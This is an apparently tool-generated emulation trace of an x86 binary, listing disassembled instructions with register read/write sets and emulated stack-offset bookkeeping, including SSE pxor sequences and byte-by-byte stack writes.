regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426834: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x426841: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426845: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x426851: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42685e: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x42686a: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x426872: pxor xmm1, xmm3, regs_read: [123, 125], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426876: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x426883: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4268a7: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4268bd: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4268c9: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4268d0: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4268e3: mov edx, dword ptr [eax + 0x34], regs_read: [19], regs_write: [24] 0x4268f0: mov edx, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x4268f6: mov dword ptr [eax + 0x34], ecx, regs_read: [19, 22], regs_write: () 0x4268f9: mov ecx, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 0x4268ff: mov dword ptr [ebp - 0x70], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x426905: mov dword ptr [ebp - 0x68], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x42692a: mov ecx, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x42692d: movaps xmm7, xmmword ptr [0x4c8bc0], regs_read: (), regs_write: [129] 0x42693a: mov ecx, 0xa, regs_read: (), regs_write: [22] 0x426950: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x426957: pxor xmm5, xmm3, regs_read: [127, 125], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426960: movaps xmm4, xmm5, regs_read: [127], regs_write: [126] 0x426967: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x42696a: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42696e: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x42697b: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42697f: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x426986: pxor xmm5, xmm2, regs_read: [127, 124], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426998: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x4269a9: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x4269ac: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4269b0: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4269bd: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4269c5: pxor xmm5, xmm2, regs_read: [127, 124], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4269d2: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x4269d5: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4269d9: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x4269e6: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4269ea: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x4269f6: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426a03: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x426a0f: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x426a17: pxor xmm1, xmm3, regs_read: [123, 125], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426a1b: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x426a28: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426a38: mov ecx, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x426a67: mov dword ptr [ebp - 0x6c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x426a77: mov al, byte ptr [esi + ecx], regs_read: [29, 22], regs_write: [2] 0x426a7c: mov byte ptr [edi + ecx], al, regs_read: [23, 22, 2], regs_write: () 0x426a81: mov eax, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 0x426a85: mov dword ptr [ebp - 0x6c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x426a96: push 0x40, regs_read: [30], regs_write: [30] 0x426a98: push eax, regs_read: [30, 19], regs_write: [30] 0x426aa1: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x14 and offset 0x7ffc for stack size 0x10000 0x426aa4: pop edi, regs_read: [30], regs_write: [30, 23] 0x426aa7: pop esi, regs_read: [30], regs_write: [30, 29] 0x426aad: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426aaf: pop ebp, regs_read: [30], regs_write: [30, 20] 0x426ab0: mov esp, ebx, regs_read: [21], regs_write: [30] 0x426ab2: pop ebx, regs_read: [30], regs_write: [30, 21] 0x426ac0: push ebp, regs_read: [30, 20], regs_write: [30] 0x426ac1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x426ac6: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x426acd: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x4 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x426ad0: mov ecx, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x4 and offset 0x8014 for stack size 0x10000 0x426ad3: push ebx, regs_read: [30, 21], regs_write: [30] 0x426ad4: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x426ad7: push esi, regs_read: [30, 29], regs_write: [30] 0x426ad8: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x4 and offset 0x800c for stack size 0x10000 0x426adb: mov eax, esi, regs_read: [29], regs_write: [19] 0x426add: push edi, regs_read: [30, 23], regs_write: [30] 0x426ade: mov edi, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x8 and offset 0x8010 for stack size 0x10000 0x426ae9: mov eax, dword ptr [ebp + 0x18], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x8018 for stack size 0x10000 0x426af7: mov eax, dword ptr [ecx], regs_read: [22], regs_write: [19] 0x426af9: mov ecx, dword ptr [ecx + 4], regs_read: [22], regs_write: [22] 0x426afc: mov dword ptr [ebp - 0x14], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fec for stack size 0x10000 saving data to stack: 0 4 0x426aff: mov eax, 8, regs_read: (), regs_write: [19] 0x426b08: mov dword ptr [ebp - 0x10], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x426b10: mov byte ptr [ebp + eax - 0x14], 0, regs_read: [20, 19], regs_write: () 0x426b28: push 0, regs_read: [30], regs_write: [30] 0x426b2d: push eax, regs_read: [30, 19], regs_write: [30] 0x426b31: push eax, regs_read: [30, 19], regs_write: [30] 0x426b32: push ebx, regs_read: [30, 21], regs_write: [30] 0x426b44: mov byte ptr [ebp - 0xc], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x18 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 1 0x426b50: mov byte ptr [ebp - 0xb], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x18 and offset 0x7ff5 for stack size 0x10000 saving data to stack: 0 1 0x426b5c: mov byte ptr [ebp - 0xa], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x18 and offset 0x7ff6 for stack size 0x10000 saving data to stack: 0 1 0x426b68: mov byte ptr [ebp - 9], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x18 and offset 0x7ff7 for stack size 0x10000 saving data to stack: 0 1 0x426b74: mov byte ptr [ebp - 8], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x18 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 1 0x426b80: mov byte ptr [ebp - 7], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x18 and offset 0x7ff9 for stack size 0x10000 saving data to stack: 0 1 0x426b88: mov byte ptr [ebp - 6], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x18 and offset 0x7ffa for stack size 0x10000 saving data to stack: 0 1 0x426b94: mov eax, esi, regs_read: [29], regs_write: [19] 0x426ba7: mov esi, eax, regs_read: [19], regs_write: [29] 0x426bad: push 0, regs_read: [30], regs_write: [30] 0x426bb2: push eax, regs_read: [30, 19], regs_write: [30] 0x426bb6: push eax, regs_read: [30, 19], regs_write: [30] 0x426bba: push eax, regs_read: [30, 19], regs_write: [30] 0x426bc7: push esi, regs_read: [30, 29], regs_write: [30] 0x426bcb: push eax, regs_read: [30, 19], regs_write: [30] 0x426bcc: push ebx, regs_read: [30, 21], regs_write: [30] 0x426bd8: push 0x40, regs_read: [30], regs_write: [30] 0x426bda: push eax, regs_read: [30, 19], regs_write: [30] 0x426be3: push 0x20, regs_read: [30], regs_write: [30] 0x426be5: push eax, regs_read: [30, 19], regs_write: [30] 0x426bee: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x7ffc for stack size 0x10000 0x426bf3: pop edi, regs_read: [30], regs_write: [30, 23] 0x426bf4: pop esi, regs_read: [30], regs_write: [30, 29] 0x426bf7: pop ebx, regs_read: [30], regs_write: [30, 21] 0x426bfd: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x38 and offset 0x8000 for stack size 0x10000 0x426bff: pop ebp, regs_read: [30], regs_write: [30, 20] 0x426c10: push ebp, regs_read: [30, 20], regs_write: [30] 0x426c11: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x426c19: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x426c20: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 8 4 0x426c23: mov edx, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x8014 for stack size 0x10000 0x426c26: mov ecx, dword ptr [ebp + 0x18], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x8018 for stack size 0x10000 0x426c29: push ebx, regs_read: [30, 21], regs_write: [30] 0x426c2a: mov ebx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8010 for stack size 0x10000 0x426c2d: mov eax, ebx, regs_read: [21], regs_write: [19] 0x426c31: mov dword ptr [ebp - 0x84], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x4 and offset 0x7f7c for stack size 0x10000 saving data to stack: 0 4 0x426c37: push edi, regs_read: [30, 23], regs_write: [30] 0x426c38: mov edi, dword ptr [ebp + 8], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x8 and offset 0x8008 for stack size 0x10000 0x426c3b: mov dword ptr [ebp - 0x88], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x426c41: mov dword ptr [ebp - 0x8c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f74 for stack size 0x10000 saving data to stack: 0 4 0x426c4d: mov eax, dword ptr [ebp + 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x8024 for stack size 0x10000 0x426c50: push esi, regs_read: [30, 29], regs_write: [30] 0x426c5c: mov eax, dword ptr [ecx], regs_read: [22], regs_write: [19] 0x426c5e: mov ecx, dword ptr [ecx + 4], regs_read: [22], regs_write: [22] 0x426c61: mov dword ptr [ebp - 0x14], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 saving data to stack: 0 4 0x426c64: mov eax, dword ptr [ebp + 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x8020 for stack size 0x10000 0x426c67: mov dword ptr [ebp - 0x10], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x426c6a: mov ecx, dword ptr [ebp + 0x1c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x801c for stack size 0x10000 0x426c6d: mov byte ptr [ebp - 0xc], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 1 0x426c7b: mov byte ptr [ebp - 0xb], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff5 for stack size 0x10000 saving data to stack: 0 1 0x426c85: mov byte ptr [ebp - 0xa], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff6 for stack size 0x10000 saving data to stack: 0 1 0x426c8f: mov byte ptr [ebp - 9], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff7 for stack size 0x10000 saving data to stack: 0 1 0x426c99: mov byte ptr [ebp - 8], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 1 0x426ca3: mov byte ptr [ebp - 7], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff9 for stack size 0x10000 saving data to stack: 0 1 0x426cad: mov byte ptr [ebp - 6], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0xc and offset 0x7ffa for stack size 0x10000 saving data to stack: 0 1 0x426cb4: mov byte ptr [ebp - 5], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0xc and offset 0x7ffb for stack size 0x10000 saving data to stack: 0 1 0x426cc0: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x426cc3: mov dword ptr [ebp - 0x80], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 4 0x426ccb: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x426cd1: mov eax, edi, regs_read: [23], regs_write: [19] 0x426cd8: mov dword ptr [ebp - 0x80], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 4 0x426cdb: mov dword ptr [ebp - 0x78], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 saving data to stack: 0 4 0x426cde: mov eax, esi, regs_read: [29], regs_write: [19] 0x426ce2: mov dword ptr [ebp - 0x7c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f84 for stack size 0x10000 saving data to stack: 0 4 0x426ce5: push 0, regs_read: [30], regs_write: [30] 0x426cea: push eax, regs_read: [30, 19], regs_write: [30] 0x426cee: push eax, regs_read: [30, 19], regs_write: [30] 0x426cf2: push eax, regs_read: [30, 19], regs_write: [30] 0x426d16: mov ebx, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x1c and offset 0x7f88 for stack size 0x10000 0x426d19: mov edi, dword ptr [ebp - 0x7c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x7f84 for stack size 0x10000 0x426d26: mov cl, byte ptr [edi + edx], regs_read: [23, 24], regs_write: [10] 0x426d2b: mov byte ptr [edx + ebx], cl, regs_read: [24, 21, 10], regs_write: () 0x426d33: mov edi, dword ptr [ebp - 0x88], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x7f78 for stack size 0x10000 0x426d39: mov ebx, dword ptr [ebp - 0x80], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x1c and offset 0x7f80 for stack size 0x10000 0x426d45: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8000 for stack size 0x10000 0x426d54: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8000 for stack size 0x10000 0x426d64: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8000 for stack size 0x10000 0x426d74: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8000 for stack size 0x10000 0x426d85: mov byte ptr [ebp - 0xc], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x1c and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 1 0x426d8d: mov edx, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x7f74 for stack size 0x10000 0x426d97: mov byte ptr [ebp - 0xb], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x1c and offset 0x7ff5 for stack size 0x10000 saving data to stack: 0 1 0x426da3: mov byte ptr [ebp - 0xa], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x1c and offset 0x7ff6 for stack size 0x10000 saving data to stack: 0 1 0x426daf: mov byte ptr [ebp - 9], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x1c and offset 0x7ff7 for stack size 0x10000 saving data to stack: 0 1 0x426dbb: mov byte ptr [ebp - 8], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x1c and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 1 0x426dc7: mov byte ptr [ebp - 7], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x1c and offset 0x7ff9 for stack size 0x10000 saving data to stack: 0 1 0x426dcf: mov eax, dword ptr [ebp - 0x84], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f7c for stack size 0x10000 0x426dd5: mov byte ptr [ebp - 6], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x1c and offset 0x7ffa for stack size 0x10000 saving data to stack: 0 1 0x426de1: mov dword ptr [ebp - 0x84], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7f7c for stack size 0x10000 saving data to stack: 0 4 0x426de7: mov ecx, eax, regs_read: [19], regs_write: [22] 0x426dfa: mov dword ptr [ebp - 0x8c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7f74 for stack size 0x10000 saving data to stack: 0 4 0x426e03: mov dword ptr [ebp - 0x88], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x1c and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x426e09: mov dword ptr [ebp - 0x80], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 4 0x426e1f: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x426e21: mov dword ptr [ebp - 0x84], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x7f7c for stack size 0x10000 saving data to stack: 0 4 0x426e29: mov dword ptr [ebp - 0x80], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x1c and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 4 0x426e2c: mov dword ptr [ebp - 0x88], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x1c and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x426e38: push 0, regs_read: [30], regs_write: [30] 0x426e3d: push eax, regs_read: [30, 19], regs_write: [30] 0x426e41: push eax, regs_read: [30, 19], regs_write: [30] 0x426e45: push eax, regs_read: [30, 19], regs_write: [30] 0x426e8a: mov eax, ebx, regs_read: [21], regs_write: [19] 0x426e8f: mov ebx, esi, regs_read: [29], regs_write: [21] 0x426e96: mov dword ptr [ebp - 0x90], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x2c and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x426e9c: mov dword ptr [ebp - 0x8c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x2c and offset 0x7f74 for stack size 0x10000 saving data to stack: 0 4 0x426eaa: mov dword ptr [ebp - 0x7c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x2c and offset 0x7f84 for stack size 0x10000 saving data to stack: 0 4 0x426eb0: mov esi, dword ptr [ebp - 0x7c], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x2c and offset 0x7f84 for stack size 0x10000 0x426eb5: mov dword ptr [ebp - 0x78], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x2c and offset 0x7f88 for stack size 0x10000 saving data to stack: 0 4 0x426ebd: mov edi, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x2c and offset 0x7f74 for stack size 0x10000 0x426ec3: mov dword ptr [ebp - 0x94], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x2c and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x426ed4: mov ebx, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x2c and offset 0x7f88 for stack size 0x10000 0x426ee5: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x2c and offset 0x8000 for stack size 0x10000 0x426ef7: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x2c and offset 0x8000 for stack size 0x10000 0x426f08: mov ebx, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x2c and offset 0x7f6c for stack size 0x10000 0x426f0e: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x2c and offset 0x8000 for stack size 0x10000 0x426f1f: mov ebx, dword ptr [ebp - 0x84], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x2c and offset 0x7f7c for stack size 0x10000 0x426f25: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x2c and offset 0x8000 for stack size 0x10000 0x426f35: mov esi, dword ptr [ebp - 0x80], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x2c and offset 0x7f80 for stack size 0x10000 0x426f38: mov edi, dword ptr [ebp - 0x88], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x2c and offset 0x7f78 for stack size 0x10000 0x426f3e: mov dword ptr [ebp - 0x90], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x2c and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x426f56: mov al, byte ptr [esi + ecx], regs_read: [29, 22], regs_write: [2] 0x426f5b: mov byte ptr [ecx + edi], al, regs_read: [22, 23, 2], regs_write: () 0x426f65: push 0x40, regs_read: [30], regs_write: [30] 0x426f67: push eax, regs_read: [30, 19], regs_write: [30] 0x426f70: push 0x20, regs_read: [30], regs_write: [30] 0x426f72: push eax, regs_read: [30, 19], regs_write: [30] 0x426f7b: pop esi, regs_read: [30], regs_write: [30, 29] 0x426f7c: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x38 and offset 0x7ffc for stack size 0x10000 0x426f81: pop edi, regs_read: [30], regs_write: [30, 23] 0x426f84: pop ebx, regs_read: [30], regs_write: [30, 21] 0x426f8a: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x30 and offset 0x8000 for stack size 0x10000 0x426f8c: pop ebp, regs_read: [30], regs_write: [30, 20] 0x426f90: push ebp, regs_read: [30, 20], regs_write: [30] 0x426f91: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x426f96: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x426f9d: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x426fa0: push ebx, regs_read: [30, 21], regs_write: [30] 0x426fa1: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8008 for stack size 0x10000 0x426fa4: push esi, regs_read: [30, 29], regs_write: [30] 0x426fa5: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x8 and offset 0x800c for stack size 0x10000 0x426fa8: mov eax, esi, regs_read: [29], regs_write: [19] 0x426faf: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x426fb5: push eax, regs_read: [30, 19], regs_write: [30] 0x426fbb: push 0, regs_read: [30], regs_write: [30] 0x426fbd: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x426fc3: push eax, regs_read: [30, 19], regs_write: [30] 0x426fc9: push esi, regs_read: [30, 29], regs_write: [30] 0x426fca: push 0, regs_read: [30], regs_write: [30] 0x426fcc: push ebx, regs_read: [30, 21], regs_write: [30] 0x426fd2: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x426fd8: push esi, regs_read: [30, 29], regs_write: [30] 0x426fd9: push ebx, regs_read: [30, 21], regs_write: [30] 0x426fda: push ebx, regs_read: [30, 21], regs_write: [30] 0x426fdb: push eax, regs_read: [30, 19], regs_write: [30] 0x426fe4: push 0x40, regs_read: [30], regs_write: [30] 0x426fe6: push eax, regs_read: [30, 19], regs_write: [30] 0x426fef: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x7ffc for stack size 0x10000 0x426ff4: pop esi, regs_read: [30], regs_write: [30, 29] 0x426ff7: pop ebx, regs_read: [30], regs_write: [30, 21] 0x426ffd: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x3c and offset 0x8000 for stack size 0x10000 0x426fff: pop ebp, regs_read: [30], regs_write: [30, 20] 0x427010: push ebp, regs_read: [30, 20], regs_write: [30] 0x427011: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x427016: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x42701d: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x427020: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x427023: mov dword ptr [ebp - 0x48], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x427026: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x42702c: push ebx, regs_read: [30, 21], regs_write: [30] 0x42702d: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8008 for stack size 0x10000 0x427032: mov eax, dword ptr [ebp + 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x801c for stack size 0x10000 0x427035: push dword ptr [ebp + 0x24], regs_read: [30, 20], regs_write: [30] 0x427038: mov dword ptr [ebp - 0x50], eax, regs_read: [20, 19], regs_write: () adjusting stack 